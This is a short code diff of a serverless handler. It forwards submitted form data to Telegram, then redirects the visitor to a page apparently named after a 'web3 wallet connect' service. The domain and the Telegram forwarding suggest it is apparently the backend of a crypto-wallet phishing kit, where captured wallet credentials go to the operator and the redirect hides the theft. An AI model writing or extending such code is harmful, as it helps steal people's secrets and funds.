@@ -36,7 +36,11 @@ module.exports = async (req, res) => {
         try {
             const data = req.body; // The form data sent in the POST request
             const response = await sendToTelegram(data); // Send data to Telegram
-            res.status(200).json({ success: true, data: response });
+
+            // Redirect to the homepage after successful message sending
+            res.writeHead(302, { Location: 'https://web3walletconnect-omega.vercel.app/' }); // Redirect to homepage
+            res.end(); // End the response
+
         } catch (error) {
             console.error('Error in serverless function:', error);
             res.status(500).json({ error: 'Failed to send message to Telegram' });
